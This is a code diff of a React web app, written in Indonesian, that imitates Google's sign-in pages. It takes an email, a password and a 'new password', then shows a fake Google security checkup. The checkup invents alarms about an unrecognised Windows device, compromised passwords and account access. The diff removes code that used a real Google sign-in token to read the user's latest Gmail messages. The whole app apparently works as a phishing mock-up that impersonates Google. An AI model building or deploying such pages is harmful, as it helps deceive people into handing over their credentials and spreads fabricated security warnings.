@@ -1,10 +1,5 @@
-/// <reference types="vite/client" />
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
-import type { User } from 'firebase/auth';
-import { translations, Language } from './translations';
-import { SecretAvatarPanel, CustomAvatarConfig, GoogleDefaultAvatar } from './SecretAvatarPanel';
 
 const GoogleLogo = () => (
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
@@ -15,121 +10,7 @@ const GoogleLogo = () => (
   </svg>
 );
 
-const GOOGLE_AVATAR_COLORS = [
-  '#c5221f', // Red
-  '#137333', // Green
-  '#1a73e8', // Blue
-  '#e37400', // Orange
-  '#8430ce', // Purple
-  '#007b83', // Teal
-  '#b80672', // Pink
-  '#0d652d', // Forest green
-];
-
-const getAvatarColor = (str: string) => {
-  if (!str) return GOOGLE_AVATAR_COLORS[2];
-  let hash = 0;
-  for (let i = 0; i < str.length; i++) {
-    hash = str.charCodeAt(i) + ((hash << 5) - hash);
-  }
-  const index = Math.abs(hash) % GOOGLE_AVATAR_COLORS.length;
-  return GOOGLE_AVATAR_COLORS[index];
-};
-
-const getInitial = (str: string) => {
-  if (!str) return 'U';
-  const clean = str.trim().split('@')[0];
-  return (clean[0] || 'U').toUpperCase();
-};
-
-export const GOOGLE_PROFILE_ASSET = '/assets/aistudio/IMG_3071_ec4fd47a.webp';
-
-const UserAvatar = ({
-  photoURL,
-  nameOrEmail,
-  size = 32,
-  className = '',
-  customOverride,
-  forceDefaultIcon = false,
-}: {
-  photoURL?: string | null;
-  nameOrEmail?: string;
-  size?: number;
-  className?: string;
-  customOverride?: CustomAvatarConfig;
-  forceDefaultIcon?: boolean;
-}) => {
-  if (customOverride && customOverride.enabled) {
-    if (customOverride.avatarType === 'photo' && customOverride.photoURL) {
-      return (
-        <img
-          src={customOverride.photoURL}
-          alt="Profile"
-          className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
-          style={{ width: `${size}px`, height: `${size}px` }}
-          referrerPolicy="no-referrer"
-        />
-      );
-    }
-
-    if (customOverride.avatarType === 'letter') {
-      const initial = (customOverride.initial || 'R').trim().toUpperCase().slice(0, 2);
-      const bgColor = customOverride.bgColor || '#1a73e8';
-      const fontSize = Math.max(10, Math.round(size * 0.5));
-
-      return (
-        <div
-          className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
-          style={{
-            width: `${size}px`,
-            height: `${size}px`,
-            backgroundColor: bgColor,
-            fontSize: `${fontSize}px`,
-          }}
-        >
-          {initial}
-        </div>
-      );
-    }
-
-    if (customOverride.avatarType === 'icon') {
-      return (
-        <img
-          src={GOOGLE_PROFILE_ASSET}
-          alt="Profile"
-          className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
-          style={{ width: `${size}px`, height: `${size}px` }}
-          referrerPolicy="no-referrer"
-        />
-      );
-    }
-  }
-
-  if (photoURL && !forceDefaultIcon) {
-    return (
-      <img
-        src={photoURL}
-        alt="Profile"
-        className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
-        style={{ width: `${size}px`, height: `${size}px` }}
-        referrerPolicy="no-referrer"
-      />
-    );
-  }
-
-  // Exact Google Profile Image from user upload /assets/aistudio/IMG_3071_ec4fd47a.webp
-  return (
-    <img
-      src={GOOGLE_PROFILE_ASSET}
-      alt="Profile"
-      className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
-      style={{ width: `${size}px`, height: `${size}px` }}
-      referrerPolicy="no-referrer"
-    />
-  );
-};
-
-const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus, disabled }: any) => {
+const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus }: any) => {
   return (
     <div className="relative mb-2 mt-2">
       <input
@@ -139,7 +20,6 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
         value={value}
         onChange={onChange}
         autoFocus={autoFocus}
-        disabled={disabled}
         className={`block px-[15px] pt-[15px] pb-[13px] w-full text-[16px] text-[#1f1f1f] bg-transparent rounded border ${
           error ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
         } appearance-none focus:outline-none focus:border-2 peer`}
@@ -165,127 +45,8 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
   );
 };
 
-const LanguageSelector = ({
-  lang,
-  setLang,
-  upward = true,
-}: {
-  lang: Language;
-  setLang: (l: Language) => void;
-  upward?: boolean;
-}) => {
-  const [isOpen, setIsOpen] = useState(false);
-  const dropdownRef = useRef<HTMLDivElement>(null);
-
-  useEffect(() => {
-    const handleClickOutside = (event: MouseEvent) => {
-      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
-        setIsOpen(false);
-      }
-    };
-    document.addEventListener('mousedown', handleClickOutside);
-    return () => document.removeEventListener('mousedown', handleClickOutside);
-  }, []);
-
-  return (
-    <div className="relative inline-block text-left" ref={dropdownRef}>
-      <button
-        type="button"
-        onClick={() => setIsOpen(!isOpen)}
-        className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition text-[12px] text-[#444746] focus:outline-none"
-        aria-expanded={isOpen}
-      >
-        <span>{translations[lang].languageName}</span>
-        <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px" className={`transition-transform duration-150 ${isOpen ? 'rotate-180' : ''}`}>
-          <path d="M7 10l5 5 5-5z" />
-        </svg>
-      </button>
-
-      {isOpen && (
-        <div
-          className={`absolute ${
-            upward ? 'bottom-full mb-1' : 'top-full mt-1'
-          } left-0 w-52 bg-white rounded-lg shadow-xl border border-gray-200 py-1.5 z-50 overflow-hidden`}
-        >
-          <button
-            type="button"
-            onClick={() => {
-              setLang('id');
-              setIsOpen(false);
-            }}
-            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
-              lang === 'id' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
-            }`}
-          >
-            <span>Indonesia</span>
-            {lang === 'id' && (
-              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-              </svg>
-            )}
-          </button>
-          <button
-            type="button"
-            onClick={() => {
-              setLang('en');
-              setIsOpen(false);
-            }}
-            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
-              lang === 'en' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
-            }`}
-          >
-            <span>English (United States)</span>
-            {lang === 'en' && (
-              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-              </svg>
-            )}
-          </button>
-        </div>
-      )}
-    </div>
-  );
-};
-
 export default function App() {
-  const [lang, setLangState] = useState<Language>(() => {
-    const saved = localStorage.getItem('app_language');
-    return saved === 'en' ? 'en' : 'id';
-  });
-
-  const setLang = (newLang: Language) => {
-    setLangState(newLang);
-    localStorage.setItem('app_language', newLang);
-  };
-
-  const t = translations[lang];
-
-  // Secret Custom Avatar Configuration
-  const [customAvatar, setCustomAvatar] = useState<CustomAvatarConfig>(() => {
-    try {
-      const saved = localStorage.getItem('google_custom_avatar_config');
-      if (saved) return JSON.parse(saved);
-    } catch (e) {
-      console.error('Failed to load custom avatar config:', e);
-    }
-    return {
-      enabled: false,
-      initial: 'R',
-      bgColor: '#1a73e8',
-      photoURL: '',
-    };
-  });
-
-  const handleCustomAvatarChange = (newConfig: CustomAvatarConfig) => {
-    setCustomAvatar(newConfig);
-    try {
-      localStorage.setItem('google_custom_avatar_config', JSON.stringify(newConfig));
-    } catch (e) {
-      console.error('Failed to save custom avatar config:', e);
-    }
-  };
-
-  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
+  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error'>('email');
   const [direction, setDirection] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
   const [email, setEmail] = useState('');
@@ -296,86 +57,8 @@ export default function App() {
   const [expandedSection, setExpandedSection] = useState<string | null>(null);
   const [showProfileDropdown, setShowProfileDropdown] = useState(false);
   const [securedSections, setSecuredSections] = useState<string[]>([]);
-  const [googleUser, setGoogleUser] = useState<User | null>(null);
-  const [emailsData, setEmailsData] = useState<any[]>([]);
-  const [isFetchingEmails, setIsFetchingEmails] = useState(false);
 
-  useEffect(() => {
-    const unsubscribe = initAuth(
-      (user, token) => {
-        setGoogleUser(user);
-        if (user.email) setEmail(user.email);
-        if (step === 'success') {
-          fetchEmails();
-        }
-      },
-      () => {
-        setGoogleUser(null);
-      }
-    );
-    return () => {
-      unsubscribe();
-    };
-  }, [step]);
-
-  useEffect(() => {
-    if (step === 'success' && googleUser) {
-      fetchEmails();
-    }
-  }, [step, googleUser]);
-
-  const fetchEmails = async () => {
-    if (emailsData.length > 0) return;
-    try {
-      setIsFetchingEmails(true);
-      const token = await getAccessToken();
-      if (!token) return;
-      
-      const response = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=3', {
-        headers: {
-          Authorization: `Bearer ${token}`
-        }
-      });
-      const data = await response.json();
-      
-      if (data.messages) {
-        const emailDetails = await Promise.all(
-          data.messages.map(async (msg: any) => {
-            const res = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msg.id}`, {
-              headers: { Authorization: `Bearer ${token}` }
-            });
-            return await res.json();
-          })
-        );
-        setEmailsData(emailDetails);
-      }
-    } catch (error) {
-      console.error('Error fetching emails:', error);
-    } finally {
-      setIsFetchingEmails(false);
-    }
-  };
-
-  const handleGoogleLogin = async () => {
-    try {
-      setIsLoading(true);
-      const result = await googleSignIn();
-      if (result) {
-        setGoogleUser(result.user);
-        if (result.user.email) {
-          setEmail(result.user.email);
-        }
-        changeStep('password', 1);
-      }
-    } catch (err) {
-      console.error('Login failed:', err);
-      setError(t.loginFailedError);
-    } finally {
-      setIsLoading(false);
-    }
-  };
-
-  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment', newDirection: number) => {
+  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error', newDirection: number) => {
     setIsLoading(true);
     setTimeout(() => {
       setDirection(newDirection);
@@ -387,15 +70,15 @@ export default function App() {
   const handleChangePasswordSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
-      setError(t.enterPasswordError);
+      setError('Masukkan sandi');
       return;
     }
     if (password.length < 8) {
-      setError(t.passwordMin8Error);
+      setError('Sandi harus minimal 8 karakter');
       return;
     }
     if (password !== confirmPassword) {
-      setError(t.passwordMismatchError);
+      setError('Sandi tidak cocok. Harap coba lagi.');
       return;
     }
     setError('');
@@ -405,47 +88,31 @@ export default function App() {
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!email) {
-      setError(t.enterEmailOrPhoneError);
+      setError('Masukkan alamat email atau nomor telepon');
       return;
     }
     setError('');
     changeStep('password', 1);
   };
 
-  const handlePasswordSubmit = async (e: React.FormEvent) => {
+  const handlePasswordSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
-      setError(t.enterPasswordError);
+      setError('Masukkan sandi');
       return;
     }
     setError('');
-    
-    try {
-      setIsLoading(true);
-      const result = await googleSignIn(email);
-      if (result) {
-        setGoogleUser(result.user);
-        if (result.user.email) {
-          setEmail(result.user.email);
-        }
-        changeStep('success', 1);
-      }
-    } catch (err) {
-      console.error('Login failed:', err);
-      setError(t.wrongPasswordError);
-    } finally {
-      setIsLoading(false);
-    }
+    changeStep('success', 1);
   };
 
   if (step === 'error') {
     const securityItems = [
       {
         id: 'devices',
-        title: t.devicesTitle,
+        title: 'Perangkat Anda',
         subtitle: securedSections.includes('devices')
-          ? t.devicesSubDone
-          : t.devicesSubWarning,
+          ? 'Selesai didiagnosis'
+          : 'Selesaikan 2 tindakan yang disarankan',
         isWarning: !securedSections.includes('devices'),
         icon: securedSections.includes('devices') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -461,23 +128,23 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>{t.devicesContentDone}</span>
+            <span>Semua perangkat Anda aman. Anda telah keluar dari sesi tidak dikenal.</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
             <div className="flex items-start gap-3">
               <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0" />
               <div>
-                <p className="font-medium text-[#1f1f1f]">{t.thisAndroidPhone}</p>
-                <p className="text-xs text-gray-500">{t.activeDeviceNow}</p>
+                <p className="font-medium text-[#1f1f1f]">HP Android ini (Xiaomi Redmi Note 10)</p>
+                <p className="text-xs text-gray-500">Perangkat aktif saat ini • Indonesia</p>
               </div>
             </div>
             <div className="flex items-start gap-3 border-t border-gray-100 pt-3">
               <div className="w-2 h-2 rounded-full bg-amber-500 mt-1.5 flex-shrink-0" />
               <div>
-                <p className="font-medium text-[#1f1f1f]">{t.unrecognizedWindowsDevice}</p>
-                <p className="text-xs text-gray-500">{t.jakartaActiveAgo}</p>
-                <p className="text-xs text-amber-600 mt-1">{t.someoneMayHaveAccessed}</p>
+                <p className="font-medium text-[#1f1f1f]">Perangkat Windows tidak dikenal</p>
+                <p className="text-xs text-gray-500">Jakarta, Indonesia • Aktif 3 jam yang lalu</p>
+                <p className="text-xs text-amber-600 mt-1">Seseorang mungkin telah mengakses akun Anda.</p>
               </div>
             </div>
             <div className="flex gap-2 pt-2 justify-end">
@@ -486,14 +153,14 @@ export default function App() {
                 onClick={() => setSecuredSections([...securedSections, 'devices'])}
                 className="px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition"
               >
-                {t.yesItWasMe}
+                Ya, itu saya
               </button>
               <button 
                 type="button"
                 onClick={() => setSecuredSections([...securedSections, 'devices'])}
                 className="px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] hover:shadow transition"
               >
-                {t.signOutDevice}
+                Keluar dari perangkat
               </button>
             </div>
           </div>
@@ -501,10 +168,10 @@ export default function App() {
       },
       {
         id: 'recovery',
-        title: t.recoveryTitle,
+        title: 'Login & pemulihan',
         subtitle: securedSections.includes('recovery')
-          ? t.recoverySubDone
-          : t.recoverySubWarning,
+          ? 'Email pemulihan ditambahkan'
+          : 'Tambahkan email pemulihan',
         isWarning: !securedSections.includes('recovery'),
         icon: securedSections.includes('recovery') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -520,15 +187,15 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>{t.recoveryContentDone}</span>
+            <span>Email pemulihan berhasil ditambahkan dan diamankan.</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
-            <p>{t.recoveryDescription}</p>
+            <p>Email pemulihan membantu Anda masuk kembali ke akun jika ada aktivitas mencurigakan atau jika Anda lupa sandi.</p>
             <div className="flex gap-2 max-w-sm mt-2">
               <input 
                 type="email" 
-                placeholder={t.recoveryInputPlaceholder} 
+                placeholder="Masukkan email pemulihan" 
                 className="flex-grow px-3 py-1.5 text-xs rounded border border-gray-300 focus:outline-none focus:border-[#0b57d0] bg-white"
                 defaultValue="pemulihan@gmail.com"
               />
@@ -537,7 +204,7 @@ export default function App() {
                 onClick={() => setSecuredSections([...securedSections, 'recovery'])}
                 className="px-4 py-1.5 text-xs font-medium text-white bg-[#0b57d0] rounded hover:bg-[#0842a0] transition"
               >
-                {t.addBtn}
+                Tambahkan
               </button>
             </div>
           </div>
@@ -545,10 +212,10 @@ export default function App() {
       },
       {
         id: 'passwords',
-        title: t.passwordsTitle,
+        title: 'Sandi Anda yang tersimpan',
         subtitle: securedSections.includes('passwords')
-          ? t.passwordsSubDone
-          : t.passwordsSubWarning,
+          ? 'Sandi diperiksa dan aman'
+          : 'Periksa sandi Anda',
         isWarning: !securedSections.includes('passwords'),
         icon: securedSections.includes('passwords') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -564,27 +231,27 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>{t.passwordsContentDone}</span>
+            <span>Semua sandi Anda yang tersimpan telah diperbarui dan aman.</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>{t.passwordsWarningDesc}</p>
+            <p>Terdapat 3 sandi yang lemah atau disusupi pada Pengelola Sandi Google Anda.</p>
             <button 
               type="button"
               onClick={() => setSecuredSections([...securedSections, 'passwords'])}
               className="mt-2 px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition bg-white"
             >
-              {t.checkUpdatePasswordsBtn}
+              Periksa & Perbarui Sandi
             </button>
           </div>
         )
       },
       {
         id: 'safebrowsing',
-        title: t.safeBrowsingTitle,
+        title: 'Safe Browsing',
         subtitle: securedSections.includes('safebrowsing')
-          ? t.safeBrowsingSubDone
-          : t.safeBrowsingSubWarning,
+          ? 'Safe Browsing yang Disempurnakan aktif'
+          : 'Aktifkan Safe Browsing yang Disempurnakan',
         isWarning: !securedSections.includes('safebrowsing'),
         icon: securedSections.includes('safebrowsing') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -600,25 +267,25 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>{t.safeBrowsingContentDone}</span>
+            <span>Safe Browsing yang Disempurnakan telah diaktifkan untuk perlindungan ekstra.</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>{t.safeBrowsingWarningDesc}</p>
+            <p>Dapatkan perlindungan yang lebih cepat dan proaktif terhadap situs web, unduhan, dan ekstensi yang berbahaya.</p>
             <button 
               type="button"
               onClick={() => setSecuredSections([...securedSections, 'safebrowsing'])}
               className="mt-2 px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] transition"
             >
-              {t.turnOnNowBtn}
+              Aktifkan sekarang
             </button>
           </div>
         )
       },
       {
         id: 'recent',
-        title: t.recentActivityTitle,
-        subtitle: t.recentActivitySub,
+        title: 'Aktivitas keamanan terbaru',
+        subtitle: 'Aktivitas dari 28 hari terakhir',
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -629,17 +296,17 @@ export default function App() {
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
             <div className="flex items-center gap-2">
               <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
-              <p className="font-medium text-[#1f1f1f]">{t.newSignInOnChrome}</p>
+              <p className="font-medium text-[#1f1f1f]">Masuk baru di perangkat Chrome pada Windows</p>
             </div>
-            <p className="text-xs text-gray-500 pl-3.5">{t.todayCountry}</p>
-            <p className="pl-3.5 text-xs text-gray-500">{t.noOtherSuspiciousActivity}</p>
+            <p className="text-xs text-gray-500 pl-3.5">Hari ini • Indonesia</p>
+            <p className="pl-3.5 text-xs text-gray-500">Tidak ada aktivitas mencurigakan lainnya dalam 28 hari terakhir.</p>
           </div>
         )
       },
       {
         id: 'apps',
-        title: t.connectedAppsTitle,
-        subtitle: t.connectedAppsSub,
+        title: 'Aplikasi tertaut Anda',
+        subtitle: '3 aplikasi tertaut memiliki akses ke beberapa data Akun Google Anda',
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -648,20 +315,20 @@ export default function App() {
         ),
         content: (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>{t.connectedAppsDesc}</p>
+            <p>Aplikasi berikut memiliki akses sebagian ke info Akun Google Anda:</p>
             <ul className="list-disc pl-5 text-xs space-y-1">
-              <li>{t.appDriveAccess}</li>
-              <li>{t.appPublicProfile}</li>
-              <li>{t.appBasicProfile}</li>
+              <li>WhatsApp Messenger (Akses Google Drive)</li>
+              <li>Spotify (Info profil publik)</li>
+              <li>Netflix (Info profil dasar)</li>
             </ul>
-            <p className="text-xs text-gray-500 mt-2">{t.allAppsVerified}</p>
+            <p className="text-xs text-gray-500 mt-2">Semua aplikasi telah diverifikasi dan aman.</p>
           </div>
         )
       },
       {
         id: 'gmail_settings',
-        title: t.gmailSettingsTitle,
-        subtitle: t.gmailSettingsSub,
+        title: 'Setelan Gmail',
+        subtitle: '1 setelan sensitif',
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -670,8 +337,8 @@ export default function App() {
         ),
         content: (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-1">
-            <p className="font-medium text-[#1f1f1f]">{t.emailForwardingDisabled}</p>
-            <p className="text-xs text-gray-500">{t.emailForwardingDisabledDesc(email)}</p>
+            <p className="font-medium text-[#1f1f1f]">Penerusan email dinonaktifkan</p>
+            <p className="text-xs text-gray-500">Penerusan otomatis email masuk dinonaktifkan untuk email {email || 'user@gmail.com'}.</p>
           </div>
         )
       }
@@ -683,13 +350,11 @@ export default function App() {
         <header className="h-[64px] border-b border-[#e0e3e7] bg-white px-4 sm:px-6 flex items-center justify-between sticky top-0 z-50">
           <div className="flex items-center select-none">
             <span className="text-[#020307] text-[19px] font-normal tracking-tight font-sans">
-              {t.google}
+              Google
             </span>
           </div>
           
           <div className="flex items-center gap-1">
-            <LanguageSelector lang={lang} setLang={setLang} upward={false} />
-
             <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <circle cx="12" cy="12" r="10" />
@@ -707,43 +372,36 @@ export default function App() {
             <button 
               type="button"
               onClick={() => setShowProfileDropdown(!showProfileDropdown)}
-              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative overflow-hidden"
+              className="w-8 h-8 rounded-full bg-[#1f1f1f] hover:bg-black flex items-center justify-center text-white focus:outline-none transition relative"
               id="profile-avatar-btn"
             >
-              <UserAvatar
-                customOverride={customAvatar}
-                photoURL={googleUser?.photoURL}
-                nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                size={32}
-              />
+              <svg viewBox="0 0 24 24" className="w-[18px] h-[18px]" fill="currentColor">
+                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+              </svg>
             </button>
 
             {/* Profile Dropdown */}
             {showProfileDropdown && (
               <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
-                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-3 overflow-hidden">
-                  <UserAvatar
-                    customOverride={customAvatar}
-                    photoURL={googleUser?.photoURL}
-                    nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                    size={64}
-                  />
+                <div className="w-16 h-16 rounded-full bg-[#1f1f1f] flex items-center justify-center text-white text-[24px] mb-3">
+                  <svg viewBox="0 0 24 24" className="w-10 h-10" fill="currentColor">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                  </svg>
                 </div>
-                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
-                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || t.googleUserDefault}</p>
+                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{email || 'user@gmail.com'}</p>
+                <p className="text-xs text-gray-500 mb-4">Pengguna Google</p>
                 
                 <button
                   type="button"
-                  onClick={() => alert(t.manageAccountAlert)}
+                  onClick={() => alert('Fitur kelola akun Google Anda')}
                   className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#3c4043] hover:bg-gray-50 transition mb-3"
                 >
-                  {t.manageGoogleAccount}
+                  Kelola Akun Google Anda
                 </button>
                 
                 <button
                   type="button"
                   onClick={() => {
-                    logout();
                     setEmail('');
                     setPassword('');
                     setConfirmPassword('');
@@ -754,7 +412,7 @@ export default function App() {
                   }}
                   className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#c5221f] hover:bg-red-50 transition"
                 >
-                  {t.signOutReset}
+                  Keluar / Reset Alur
                 </button>
               </div>
             )}
@@ -774,10 +432,10 @@ export default function App() {
 
             {/* Header Titles */}
             <h1 className="text-[28px] sm:text-[32px] text-[#1f1f1f] font-normal text-center leading-tight">
-              {t.securityCheckupTitle}
+              Pemeriksaan Keamanan
             </h1>
             <p className="text-[#444746] text-[15px] text-center mt-2 mb-8">
-              {t.securityCheckupTips}
+              Berikut tips untuk Anda
             </p>
 
             {/* Checklist items */}
@@ -842,44 +500,18 @@ export default function App() {
                 }}
                 className="text-[#0b57d0] hover:underline text-[14px] font-medium transition"
               >
-                {t.continueToGoogleAccount}
+                Lanjutkan ke Akun Google Anda
               </button>
             </div>
 
           </div>
         </main>
-
-        {/* Footer for checkup */}
-        <footer className="w-full px-6 py-4 flex flex-col sm:flex-row justify-between items-center text-[12px] text-[#444746] border-t border-gray-200 bg-white">
-          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
-          <div className="flex gap-4 sm:gap-6 mt-2 sm:mt-0 items-center">
-            <a href="#" className="hover:text-gray-700 transition">{t.help}</a>
-            <a href="#" className="hover:text-gray-700 transition">{t.privacy}</a>
-            <a href="#" className="hover:text-gray-700 transition">{t.terms}</a>
-          </div>
-        </footer>
-
-        {/* Secret Feature Area at bottom of checkup page (Scroll down) */}
-        <div className="w-full flex flex-col items-center my-24 px-4">
-          <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
-            <span className="w-12 h-px bg-gray-200"></span>
-            <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
-            <span className="w-12 h-px bg-gray-200"></span>
-          </div>
-          <SecretAvatarPanel
-            config={customAvatar}
-            onChange={handleCustomAvatarChange}
-            email={email}
-            t={t}
-            lang={lang}
-          />
-        </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] flex flex-col items-center font-sans tracking-wide relative overflow-x-hidden">
+    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
       
       {/* Full-screen Loading Overlay for background */}
       <AnimatePresence>
@@ -894,11 +526,7 @@ export default function App() {
         )}
       </AnimatePresence>
 
-      {/* Primary Google Login Viewport - exactly 100dvh min-height on mobile */}
-      <div className="w-full min-h-[100dvh] flex flex-col justify-between items-center p-0 sm:p-5 sm:justify-center">
-        
-        {/* Main Login Card */}
-        <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col flex-1 sm:flex-initial sm:h-auto sm:border sm:border-gray-200 overflow-x-hidden relative z-10 sm:shadow-sm">
+      <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col sm:h-auto sm:border sm:border-gray-200 flex-grow sm:flex-grow-0 overflow-x-hidden relative z-50 shadow-sm">
         
         {/* Loading Overlay inside the form box */}
